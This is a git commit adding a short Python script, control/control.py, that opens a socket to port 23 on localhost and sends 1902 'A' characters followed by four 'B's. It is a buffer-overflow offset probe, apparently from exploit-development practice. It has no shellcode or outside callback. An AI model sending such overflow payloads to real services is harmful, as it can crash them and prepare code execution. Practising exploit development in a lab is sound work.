a80594d6423d85d0386dc774e8362004d9c1dd7e
alienum <67610662+AL1ENUM@users.noreply.github.com>
2020-12-14 01:04:44 +0200

    Add files via upload

---
+++ control/control.py
@@ -0,0 +1,14 @@
+import socket,sys
+
+
+payload = "A" * 1902 + "B" * 4
+
+try: 
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('127.0.0.1',23))
+    s.recv(1024)
+    s.send(payload)
+    s.close()
+except:
+    print("[X] Connection error")
+    sys.exit()
